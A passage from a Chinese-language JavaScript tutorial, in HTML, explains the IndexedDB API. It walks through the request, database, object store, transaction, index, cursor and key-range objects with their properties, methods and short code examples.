<li><code>IDBRequest.result</code>：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。</li>
<li><code>IDBRequest.error</code>：请求失败时，返回错误对象。</li>
<li><code>IDBRequest.source</code>：返回请求的来源（比如索引对象或 ObjectStore）。</li>
<li><code>IDBRequest.transaction</code>：返回当前请求正在进行的事务，如果不包含事务，返回<code>null</code>。</li>
<li><code>IDBRequest.onsuccess</code>：指定<code>success</code>事件的监听函数。</li>
<li><code>IDBRequest.onerror</code>：指定<code>error</code>事件的监听函数。</li>
</ul>
<p>IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。</p>
<ul>
<li><code>IDBOpenDBRequest.onblocked</code>：指定<code>blocked</code>事件（<code>upgradeneeded</code>事件触发时，数据库仍然在使用）的监听函数。</li>
<li><code>IDBOpenDBRequest.onupgradeneeded</code>：<code>upgradeneeded</code>事件的监听函数。</li>
</ul>
<h5 id="idbdatabase">IDBDatabase 对象<a class="headerlink" href="#idbdatabase" title="Permanent link">&para;</a></h5>
<p>打开数据成功以后，可以从<code>IDBOpenDBRequest</code>对象的<code>result</code>属性上面，拿到一个<code>IDBDatabase</code>对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">db</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">DBOpenRequest</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">indexedDB</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;demo&#39;</span><span class="p">,</span> <span class="mf">1</span><span class="p">);</span>

<span class="nx">DBOpenRequest</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Error&#39;</span><span class="p">);</span>
<span class="p">};</span>

<span class="nx">DBOpenRequest</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">DBOpenRequest</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="c1">// ...</span>
<span class="p">};</span>
</code></pre></div>

<p>IDBDatabase 对象有以下属性。</p>
<ul>
<li><code>IDBDatabase.name</code>：字符串，数据库名称。</li>
<li><code>IDBDatabase.version</code>：整数，数据库版本。数据库第一次创建时，该属性为空字符串。</li>
<li><code>IDBDatabase.objectStoreNames</code>：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。</li>
<li><code>IDBDatabase.onabort</code>：指定 abort 事件（事务中止）的监听函数。</li>
<li><code>IDBDatabase.onclose</code>：指定 close 事件（数据库意外关闭）的监听函数。</li>
<li><code>IDBDatabase.onerror</code>：指定 error 事件（访问数据库失败）的监听函数。</li>
<li><code>IDBDatabase.onversionchange</code>：数据库版本变化时触发（发生<code>upgradeneeded</code>事件，或调用<code>indexedDB.deleteDatabase()</code>）。</li>
</ul>
<p>下面是<code>objectStoreNames</code>属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的<code>contains</code>方法，检查数据库是否包含某个对象仓库。</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">db</span><span class="p">.</span><span class="nx">objectStoreNames</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s1">&#39;firstOS&#39;</span><span class="p">))</span> <span class="p">{</span>
  <span class="nx">db</span><span class="p">.</span><span class="nx">createObjectStore</span><span class="p">(</span><span class="s1">&#39;firstOS&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。</p>
<p>IDBDatabase 对象有以下方法。</p>
<ul>
<li><code>IDBDatabase.close()</code>：关闭数据库连接，实际会等所有事务完成后再关闭。</li>
<li><code>IDBDatabase.createObjectStore()</code>：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.deleteObjectStore()</code>：删除指定的对象仓库。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.transaction()</code>：返回一个 IDBTransaction 事务对象。</li>
</ul>
<p>下面是<code>createObjectStore()</code>方法的例子。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">indexedDB</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;demo&#39;</span><span class="p">,</span> <span class="mf">2</span><span class="p">);</span>

<span class="nx">request</span><span class="p">.</span><span class="nx">onupgradeneeded</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>

  <span class="nx">db</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
  <span class="p">};</span>

  <span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createObjectStore</span><span class="p">(</span><span class="s1">&#39;items&#39;</span><span class="p">);</span>

  <span class="c1">// ...</span>
<span class="p">};</span>
</code></pre></div>

<p>上面代码创建了一个名为<code>items</code>的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的<code>objectStoreNames</code>属性，检查已有哪些对象仓库。</p>
<p><code>createObjectStore()</code>方法还可以接受第二个对象参数，用来设置对象仓库的属性。</p>
<div class="codehilite"><pre><span></span><code>db.createObjectStore(&#39;test&#39;, { keyPath: &#39;email&#39; });
db.createObjectStore(&#39;test2&#39;, { autoIncrement: true });
</code></pre></div>

<p>上面代码中，<code>keyPath</code>属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的<code>email</code>属性值都是不一样的），默认值为<code>null</code>；<code>autoIncrement</code>属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为<code>false</code>。一般来说，<code>keyPath</code>和<code>autoIncrement</code>属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少<code>keyPath</code>指定的属性。</p>
<p>下面是<code>deleteObjectStore()</code>方法的例子。</p>
<div class="codehilite"><pre><span></span><code>var dbName = &#39;sampleDB&#39;;
var dbVersion = 2;
var request = indexedDB.open(dbName, dbVersion);

request.onupgradeneeded = function(e) {
  var db = request.result;
  if (e.oldVersion &lt; 1) {
    db.createObjectStore(&#39;store1&#39;);
  }

  if (e.oldVersion &lt; 2) {
    db.deleteObjectStore(&#39;store1&#39;);
    db.createObjectStore(&#39;store2&#39;);
  }

  // ...
};
</code></pre></div>

<p>下面是<code>transaction()</code>方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。</p>
<div class="codehilite"><pre><span></span><code>var t = db.transaction([&#39;items&#39;], &#39;readwrite&#39;);
</code></pre></div>

<p><code>transaction()</code>方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：<code>readonly</code>（只读）和<code>readwrite</code>（读写）。添加数据使用<code>readwrite</code>，读取数据使用<code>readonly</code>。第二个参数是可选的，省略时默认为<code>readonly</code>模式。</p>
<h5 id="idb-object-store">IDB Object Store 对象<a class="headerlink" href="#idb-object-store" title="Permanent link">&para;</a></h5>
<p>IDBObjectStore 对象对应一个对象仓库（object store）。<code>IDBDatabase.createObjectStore()</code>方法返回的就是一个 IDBObjectStore 对象。</p>
<p>IDBDatabase 对象的<code>transaction()</code>返回一个事务对象，该对象的<code>objectStore()</code>方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。</p>
<div class="codehilite"><pre><span></span><code>db.transaction([&#39;test&#39;], &#39;readonly&#39;)
  .objectStore(&#39;test&#39;)
  .get(X)
  .onsuccess = function (e) {}
</code></pre></div>

<p>IDBObjectStore 对象有以下属性。</p>
<ul>
<li><code>IDBObjectStore.indexNames</code>：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。</li>
<li><code>IDBObjectStore.keyPath</code>：返回当前对象仓库的主键。</li>
<li><code>IDBObjectStore.name</code>：返回当前对象仓库的名称。</li>
<li><code>IDBObjectStore.transaction</code>：返回当前对象仓库所属的事务对象。</li>
<li><code>IDBObjectStore.autoIncrement</code>：布尔值，表示主键是否会自动递增。</li>
</ul>
<p>IDBObjectStore 对象有以下方法。</p>
<p><strong>（1）IDBObjectStore.add()</strong></p>
<p><code>IDBObjectStore.add()</code>用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用<code>put()</code>方法。</p>
<div class="codehilite"><pre><span></span><code>objectStore.add(value, key)
</code></pre></div>

<p>该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为<code>null</code>。</p>
<p>创建事务以后，就可以获取对象仓库，然后使用<code>add()</code>方法往里面添加数据了。</p>
<div class="codehilite"><pre><span></span><code>var db;
var DBOpenRequest = window.indexedDB.open(&#39;demo&#39;, 1);

DBOpenRequest.onsuccess = function (event) {
  db = DBOpenRequest.result;
  var transaction = db.transaction([&#39;items&#39;], &#39;readwrite&#39;);

  transaction.oncomplete = function (event) {
    console.log(&#39;transaction success&#39;);
  };

  transaction.onerror = function (event) {
    console.log(&#39;transaction error: &#39; + transaction.error);
  };

  var objectStore = transaction.objectStore(&#39;items&#39;);
  var objectStoreRequest = objectStore.add({ foo: 1 });

  objectStoreRequest.onsuccess = function (event) {
    console.log(&#39;add data success&#39;);
  };

};
</code></pre></div>

<p><strong>（2）IDBObjectStore.put()</strong></p>
<p><code>IDBObjectStore.put()</code>方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>objectStore.put(item, key)
</code></pre></div>

<p>该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。</p>
<p><strong>（3）IDBObjectStore.clear()</strong></p>
<p><code>IDBObjectStore.clear()</code>删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>objectStore.clear()
</code></pre></div>

<p>该方法不需要参数。</p>
<p><strong>（4）IDBObjectStore.delete()</strong></p>
<p><code>IDBObjectStore.delete()</code>方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>objectStore.delete(Key)
</code></pre></div>

<p>该方法的参数为主键的值。</p>
<p><strong>（5）IDBObjectStore.count()</strong></p>
<p><code>IDBObjectStore.count()</code>方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>IDBObjectStore.count(key)
</code></pre></div>

<p>不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。</p>
<p><strong>（6）IDBObjectStore.getKey()</strong></p>
<p><code>IDBObjectStore.getKey()</code>用于获取主键。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>objectStore.getKey(key)
</code></pre></div>

<p>该方法的参数可以是主键值或 IDBKeyRange 对象。</p>
<p><strong>（7）IDBObjectStore.get()</strong></p>
<p><code>IDBObjectStore.get()</code>用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>objectStore.get(key)
</code></pre></div>

<p><strong>（8）IDBObjectStore.getAll()</strong></p>
<p><code>DBObjectStore.getAll()</code>用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>// 获取所有记录
objectStore.getAll()

// 获取所有符合指定主键或 IDBKeyRange 的记录
objectStore.getAll(query)

// 指定获取记录的数量
objectStore.getAll(query, count)
</code></pre></div>

<p><strong>（9）IDBObjectStore.getAllKeys()</strong></p>
<p><code>IDBObjectStore.getAllKeys()</code>用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code>// 获取所有记录的主键
objectStore.getAllKeys()

// 获取所有符合条件的主键
objectStore.getAllKeys(query)

// 指定获取主键的数量
objectStore.getAllKeys(query, count)
</code></pre></div>

<p><strong>（10）IDBObjectStore.index()</strong></p>
<p><code>IDBObjectStore.index()</code>方法返回指定名称的索引对象 IDBIndex。</p>
<div class="codehilite"><pre><span></span><code>objectStore.index(name)
</code></pre></div>

<p>有了索引以后，就可以针对索引所在的属性读取数据。</p>
<div class="codehilite"><pre><span></span><code>var t = db.transaction([&#39;people&#39;], &#39;readonly&#39;);
var store = t.objectStore(&#39;people&#39;);
var index = store.index(&#39;name&#39;);

var request = index.get(&#39;foo&#39;);
</code></pre></div>

<p>上面代码打开对象仓库以后，先用<code>index()</code>方法指定获取<code>name</code>属性的索引，然后用<code>get()</code>方法读取某个<code>name</code>属性(<code>foo</code>)对应的数据。如果<code>name</code>属性不是对应唯一值，这时<code>get()</code>方法有可能取回多个数据对象。另外，<code>get()</code>是异步方法，读取成功以后，只能在<code>success</code>事件的监听函数中处理数据。</p>
<p><strong>（11）IDBObjectStore.createIndex()</strong></p>
<p><code>IDBObjectStore.createIndex()</code>方法用于新建当前数据库的一个索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<div class="codehilite"><pre><span></span><code>objectStore.createIndex(indexName, keyPath, objectParameters)
</code></pre></div>

<p>该方法可以接受三个参数。</p>
<ul>
<li>indexName：索引名</li>
<li>keyPath：主键</li>
<li>objectParameters：配置对象（可选）</li>
</ul>
<p>第三个参数可以配置以下属性。</p>
<ul>
<li>unique：如果设为<code>true</code>，将不允许重复的值</li>
<li>multiEntry：如果设为<code>true</code>，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。</li>
</ul>
<p>假定对象仓库中的数据记录都是如下的<code>person</code>类型。</p>
<div class="codehilite"><pre><span></span><code>var person = {
  name: name,
  email: email,
  created: new Date()
};
</code></pre></div>

<p>可以指定这个对象的某个属性来建立索引。</p>
<div class="codehilite"><pre><span></span><code>var store = db.createObjectStore(&#39;people&#39;, { autoIncrement: true });

store.createIndex(&#39;name&#39;, &#39;name&#39;, { unique: false });
store.createIndex(&#39;email&#39;, &#39;email&#39;, { unique: true });
</code></pre></div>

<p>上面代码告诉索引对象，<code>name</code>属性不是唯一值，<code>email</code>属性是唯一值。</p>
<p><strong>（12）IDBObjectStore.deleteIndex()</strong></p>
<p><code>IDBObjectStore.deleteIndex()</code>方法用于删除指定的索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<div class="codehilite"><pre><span></span><code>objectStore.deleteIndex(indexName)
</code></pre></div>

<p><strong>（13）IDBObjectStore.openCursor()</strong></p>
<p><code>IDBObjectStore.openCursor()</code>用于获取一个指针对象。</p>
<div class="codehilite"><pre><span></span><code>IDBObjectStore.openCursor()
</code></pre></div>

<p>指针对象可以用来遍历数据。该对象也是异步的，有自己的<code>success</code>和<code>error</code>事件，可以对它们指定监听函数。</p>
<div class="codehilite"><pre><span></span><code>var t = db.transaction([&#39;test&#39;], &#39;readonly&#39;);
var store = t.objectStore(&#39;test&#39;);

var cursor = store.openCursor();

cursor.onsuccess = function (event) {
  var res = event.target.result;
  if (res) {
    console.log(&#39;Key&#39;, res.key);
    console.dir(&#39;Data&#39;, res.value);
    res.continue();
  }
}
</code></pre></div>

<p>监听函数接受一个事件对象作为参数，该对象的<code>target.result</code>属性指向当前数据记录。该记录的<code>key</code>和<code>value</code>分别返回主键和键值（即实际存入的数据）。<code>continue()</code>方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向<code>null</code>。</p>
<p><code>openCursor()</code>方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为<code>next</code>，其他可能的值为<code>prev</code>、<code>nextunique</code>和<code>prevunique</code>。后两个值表示如果遇到重复值，会自动跳过。</p>
<p><strong>（14）IDBObjectStore.openKeyCursor()</strong></p>
<p><code>IDBObjectStore.openKeyCursor()</code>用于获取一个主键指针对象。</p>
<div class="codehilite"><pre><span></span><code>IDBObjectStore.openKeyCursor()
</code></pre></div>

<h5 id="idb-transaction">IDB Transaction 对象<a class="headerlink" href="#idb-transaction" title="Permanent link">&para;</a></h5>
<p>IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。</p>
<p><code>IDBDatabase.transaction()</code>方法返回的就是一个 IDBTransaction 对象。</p>
<div class="codehilite"><pre><span></span><code>var db;
var DBOpenRequest = window.indexedDB.open(&#39;demo&#39;, 1);

DBOpenRequest.onsuccess = function(event) {
  db = DBOpenRequest.result;
  var transaction = db.transaction([&#39;demo&#39;], &#39;readwrite&#39;);

  transaction.oncomplete = function (event) {
    console.log(&#39;transaction success&#39;);
  };

  transaction.onerror = function (event) {
    console.log(&#39;transaction error: &#39; + transaction.error);
  };

  var objectStore = transaction.objectStore(&#39;demo&#39;);
  var objectStoreRequest = objectStore.add({ foo: 1 });

  objectStoreRequest.onsuccess = function (event) {
    console.log(&#39;add data success&#39;);
  };

};
</code></pre></div>

<p>事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。</p>
<div class="codehilite"><pre><span></span><code>var trans1 = db.transaction(&#39;foo&#39;, &#39;readwrite&#39;);
var trans2 = db.transaction(&#39;foo&#39;, &#39;readwrite&#39;);
var objectStore2 = trans2.objectStore(&#39;foo&#39;)
var objectStore1 = trans1.objectStore(&#39;foo&#39;)
objectStore2.put(&#39;2&#39;, &#39;key&#39;);
objectStore1.put(&#39;1&#39;, &#39;key&#39;);
</code></pre></div>

<p>上面代码中，<code>key</code>对应的键值最终是<code>2</code>，而不是<code>1</code>。因为事务<code>trans1</code>先于<code>trans2</code>创建，所以首先执行。</p>
<p>注意，事务有可能失败，只有监听到事务的<code>complete</code>事件，才能保证事务操作成功。</p>
<p>IDBTransaction 对象有以下属性。</p>
<ul>
<li><code>IDBTransaction.db</code>：返回当前事务所在的数据库对象 IDBDatabase。</li>
<li><code>IDBTransaction.error</code>：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回<code>null</code>。</li>
<li><code>IDBTransaction.mode</code>：返回当前事务的模式，默认是<code>readonly</code>（只读），另一个值是<code>readwrite</code>。</li>
<li><code>IDBTransaction.objectStoreNames</code>：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。</li>
<li><code>IDBTransaction.onabort</code>：指定<code>abort</code>事件（事务中断）的监听函数。</li>
<li><code>IDBTransaction.oncomplete</code>：指定<code>complete</code>事件（事务成功）的监听函数。</li>
<li><code>IDBTransaction.onerror</code>：指定<code>error</code>事件（事务失败）的监听函数。</li>
</ul>
<p>IDBTransaction 对象有以下方法。</p>
<ul>
<li><code>IDBTransaction.abort()</code>：终止当前事务，回滚所有已经进行的变更。</li>
<li><code>IDBTransaction.objectStore(name)</code>：返回指定名称的对象仓库 IDBObjectStore。</li>
</ul>
<h5 id="idbindex">IDBIndex 对象<a class="headerlink" href="#idbindex" title="Permanent link">&para;</a></h5>
<p>IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。</p>
<p>IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。</p>
<p><code>IDBObjectStore.index()</code>方法可以获取 IDBIndex 对象。</p>
<div class="codehilite"><pre><span></span><code>var transaction = db.transaction([&#39;contactsList&#39;], &#39;readonly&#39;);
var objectStore = transaction.objectStore(&#39;contactsList&#39;);
var myIndex = objectStore.index(&#39;lName&#39;);

myIndex.openCursor().onsuccess = function (event) {
  var cursor = event.target.result;
  if (cursor) {
    var tableRow = document.createElement(&#39;tr&#39;);
    tableRow.innerHTML =   &#39;&lt;td&gt;&#39; + cursor.value.id + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.lName + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.fName + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.jTitle + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.company + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.eMail + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.phone + &#39;&lt;/td&gt;&#39;
                         + &#39;&lt;td&gt;&#39; + cursor.value.age + &#39;&lt;/td&gt;&#39;;
    tableEntry.appendChild(tableRow);

    cursor.continue();
  } else {
    console.log(&#39;Entries all displayed.&#39;);
  }
};
</code></pre></div>

<p>IDBIndex 对象有以下属性。</p>
<ul>
<li><code>IDBIndex.name</code>：字符串，索引的名称。</li>
<li><code>IDBIndex.objectStore</code>：索引所在的对象仓库。</li>
<li><code>IDBIndex.keyPath</code>：索引的主键。</li>
<li><code>IDBIndex.multiEntry</code>：布尔值，针对<code>keyPath</code>为数组的情况，如果设为<code>true</code>，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。</li>
<li><code>IDBIndex.unique</code>：布尔值，表示创建索引时是否允许相同的主键。</li>
</ul>
<p>IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。</p>
<ul>
<li><code>IDBIndex.count()</code>：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。</li>
<li><code>IDBIndex.get(key)</code>：用来获取符合指定主键的数据记录。</li>
<li><code>IDBIndex.getKey(key)</code>：用来获取指定的主键。</li>
<li><code>IDBIndex.getAll()</code>：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。</li>
<li><code>IDBIndex.getAllKeys()</code>：该方法与<code>IDBIndex.getAll()</code>方法相似，区别是获取所有主键。</li>
<li><code>IDBIndex.openCursor()</code>：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。</li>
<li><code>IDBIndex.openKeyCursor()</code>：该方法与<code>IDBIndex.openCursor()</code>方法相似，区别是遍历所有条目的主键。</li>
</ul>
<h5 id="idbcursor">IDBCursor 对象<a class="headerlink" href="#idbcursor" title="Permanent link">&para;</a></h5>
<p>IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。</p>
<p>IDBCursor 对象一般通过<code>IDBObjectStore.openCursor()</code>方法获得。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">transaction</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">([</span><span class="s1">&#39;rushAlbumList&#39;</span><span class="p">],</span> <span class="s1">&#39;readonly&#39;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">transaction</span><span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;rushAlbumList&#39;</span><span class="p">);</span>

<span class="nx">objectStore</span><span class="p">.</span><span class="nx">openCursor</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="s1">&#39;next&#39;</span><span class="p">).</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">cursor</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">cursor</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">listItem</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">);</span>
      <span class="nx">listItem</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">cursor</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">albumTitle</span> <span class="o">+</span> <span class="s1">&#39;, &#39;</span> <span class="o">+</span> <span class="nx">cursor</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">year</span><span class="p">;</span>
      <span class="nx">list</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">listItem</span><span class="p">);</span>

      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">cursor</span><span class="p">.</span><span class="nx">source</span><span class="p">);</span>
      <span class="nx">cursor</span><span class="p">.</span><span class="k">continue</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Entries all displayed.&#39;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">};</span>
<span class="p">};</span>
</code></pre></div>

<p>IDBCursor 对象的属性。</p>
<ul>
<li><code>IDBCursor.source</code>：返回正在遍历的对象仓库或索引。</li>
<li><code>IDBCursor.direction</code>：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过<code>IDBObjectStore.openCursor()</code>方法的第二个参数指定，一旦指定就不能改变了。</li>
<li><code>IDBCursor.key</code>：返回当前记录的主键。</li>
<li><code>IDBCursor.value</code>：返回当前记录的数据值。</li>
<li>IDBCursor.primaryKey：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。</li>
</ul>
<p>IDBCursor 对象有如下方法。</p>
<ul>
<li><code>IDBCursor.advance(n)</code>：指针向前移动 n 个位置。</li>
<li><code>IDBCursor.continue()</code>：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。</li>
<li><code>IDBCursor.continuePrimaryKey()</code>：该方法需要两个参数，第一个是<code>key</code>，第二个是<code>primaryKey</code>，将指针移到符合这两个参数的位置。</li>
<li><code>IDBCursor.delete()</code>：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。</li>
<li><code>IDBCursor.update()</code>：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。</li>
</ul>
<h5 id="idbkeyrange">IDBKeyRange 对象<a class="headerlink" href="#idbkeyrange" title="Permanent link">&para;</a></h5>
<p>IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。</p>
<p>IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。</p>
<ul>
<li><code>IDBKeyRange.lowerBound()</code>：指定下限。</li>
<li><code>IDBKeyRange.upperBound()</code>：指定上限。</li>
<li><code>IDBKeyRange.bound()</code>：同时指定上下限。</li>
<li><code>IDBKeyRange.only()</code>：指定只包含一个值。</li>
</ul>
<p>下面是一些代码实例。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// All keys ≤ x</span>
<span class="kd">var</span> <span class="nx">r1</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">upperBound</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>

<span class="c1">// All keys &lt; x</span>
<span class="kd">var</span> <span class="nx">r2</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">upperBound</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// All keys ≥ y</span>
<span class="kd">var</span> <span class="nx">r3</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">lowerBound</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>

<span class="c1">// All keys &gt; y</span>
<span class="kd">var</span> <span class="nx">r4</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">lowerBound</span><span class="p">(</span><span class="nx">y</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// All keys ≥ x &amp;&amp; ≤ y</span>
<span class="kd">var</span> <span class="nx">r5</span> <span class="o">=</span> <span class="nx">IDBKeyRange</span><span class="p">.</span><span class="nx">bound</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">);</span>

<span class="c1">// All keys &gt; x &amp;&amp;&lt; y</span>
